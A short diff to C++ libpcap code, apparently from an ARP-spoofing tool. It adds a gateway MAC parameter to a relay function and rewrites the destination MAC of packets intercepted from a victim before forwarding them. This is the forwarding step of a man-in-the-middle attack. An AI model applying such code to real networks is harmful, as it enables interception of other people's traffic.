@@ -60,7 +60,7 @@ int reply(const char *dev, pcap_t *pcap, u_int8_t *mac)
     return 0;
 }
 
-int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victim_mac)
+int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victim_mac, u_int8_t *gate_mac)
 {
     while (true)
     {
@@ -82,6 +82,7 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
             if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
             {
                 printf("%u bytes captured. Actual length: %u\n", header->caplen, header->len); //헤더에서 캡쳐된 패킷 크기 가져와서 출력
+                copy_mac(gate_mac, pkt->eth_.dmac_);
                 int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), header->len);
                 if (res != 0)
                 {
